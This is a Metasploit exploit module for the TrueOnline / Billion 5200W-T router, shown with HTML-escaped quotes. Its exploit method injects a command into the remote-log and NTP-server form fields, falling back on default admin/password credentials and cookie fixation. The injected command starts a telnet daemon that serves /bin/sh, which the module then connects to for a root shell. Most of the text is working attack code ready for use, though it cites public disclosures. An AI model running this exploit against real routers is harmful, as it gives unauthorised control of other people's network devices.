# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;TrueOnline / Billion 5200W-T Router Unauthenticated Command Injection&#039;,
      &#039;Description&#039;    => %q{
        TrueOnline is a major ISP in Thailand, and it distributes a customised version of
        the Billion 5200W-T router. This customised version has at least two command injection
        vulnerabilities, one authenticated and one unauthenticated, on different firmware versions.
        This module will attempt to exploit the unauthenticated injection first, and if that fails,
        it will attempt to exploit the authenticated injection.
        This module was tested in an emulated environment, as the author doesn&#039;t have access to the
        Thai router any more. Any feedback should be sent directly to the module&#039;s author, as well as
        to the Metasploit project.
        There are other language strings in the firmware, so it is likely that this firmware is not
        only distributed in Thailand. Other Billion 5200W-T in other countries might be vulnerable too.
      },
      &#039;Author&#039;         =>
        [
          &#039;Pedro Ribeiro <pedrib@gmail.com>&#039;         # Vulnerability discovery and Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2017/Jan/40&#039;],
          [&#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt&#039;],
          [&#039;URL&#039;, &#039;https://blogs.securiteam.com/index.php/archives/2910&#039;]
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Billion 5200W-T&#039;, {}],
        ],
      &#039;Privileged&#039;     => true,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/interact&#039; },
      &#039;DisclosureDate&#039;  => &#039;Dec 26 2016&#039;,
      &#039;DefaultTarget&#039;   => 0))
    register_options(
      [
        Opt::RPORT(80),
        OptInt.new(&#039;TelnetPort&#039;, [true, "Telnet port we&#039;re going to use", 9090]),
        OptString.new(&#039;HttpUsername&#039;, [true, &#039;Username for the web interface (using default credentials)&#039;, &#039;admin&#039;]),
        OptString.new(&#039;HttpPassword&#039;, [true, &#039;Password for the web interface (using default credentials)&#039;, &#039;password&#039;]),
      ], self.class)
  end

  # no reliable way to check if this router is vulnerable

  def exploit
    command = "utelnetd -l /bin/sh -p #{datastore[&#039;TelnetPort&#039;]} -d"

    print_status("#{peer} - Attempting to exploit unauthenticated injection")
    res = send_request_cgi({
      &#039;uri&#039;     => &#039;/cgi-bin/adv_remotelog.asp&#039;,
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;vars_post&#039; => {
        &#039;RemotelogEnable&#039; => &#039;1&#039;,
        &#039;syslogServerAddr&#039; => "1.1.1.1;#{command};#",
        &#039;serverPort&#039; => &#039;514&#039;
      }
    })

    if res && res.code == 404
      print_error("#{peer} - Well that failed, trying the authenticated one...")

      cookie = "SESSIONID=#{rand_text_alpha_lower(8)}"

      # "fixate" the cookie we want - just send a GET request first, we will get a 403 but on the next
      # request the router will accept our cookie as valid
      send_request_raw({
          &#039;uri&#039;     => &#039;/&#039;,
          &#039;method&#039;  => &#039;GET&#039;,
          &#039;headers&#039; => { &#039;Cookie&#039; => cookie }
      })

      sleep 2

      body = "SaveTime=1&uiCurrentTime2=&uiCurrentTime1=&ToolsTimeSetFlag=0&uiRadioValue=0&uiClearPCSyncFlag=0&uiwPCdateMonth=0&uiwPCdateDay=&uiwPCdateYear=&uiwPCdateHour=&uiwPCdateMinute=&uiwPCdateSec=&uiCurTime=N%2FA+%28NTP+server+is+connecting%29&uiTimezoneType=0&uiViewSyncWith=0&uiPCdateMonth=1&uiPCdateDay=&uiPCdateYear=&uiPCdateHour=&uiPCdateMinute=&uiPCdateSec=&uiViewdateToolsTZ=GMT%2B07%3A00&uiViewdateDS=Disable&uiViewSNTPServer=\"%3b#{command.gsub(" ", "+")}%26%23&ntp2ServerFlag=N%2FA&ntp3ServerFlag=N%2FA"

      # send_request_raw will send the HttpUsername and HttpPassword automatically if it finds a challenge
      send_request_raw({
        &#039;uri&#039;     => &#039;/cgi-bin/tools_time.asp&#039;,
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;headers&#039; => {
          &#039;Content-Type&#039; => &#039;application/x-www-form-urlencoded&#039;,
          &#039;Cookie&#039;       => cookie
        },
        &#039;data&#039;    => body
      })

      sleep 3
    end

    begin
      ctx = { &#039;Msf&#039; => framework, &#039;MsfExploit&#039; => self }
      sock = Rex::Socket.create_tcp({ &#039;PeerHost&#039; => rhost, &#039;PeerPort&#039; => datastore[&#039;TelnetPort&#039;], &#039;Context&#039; => ctx, &#039;Timeout&#039; => 10 })
      if not sock.nil?
        print_good("#{peer} - Success, shell incoming!")
        return handler(sock)
      end
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      sock.close if sock
    end

    fail_with(Failure::Unknown, "#{peer} - Failed to exploit router.")
  end
end

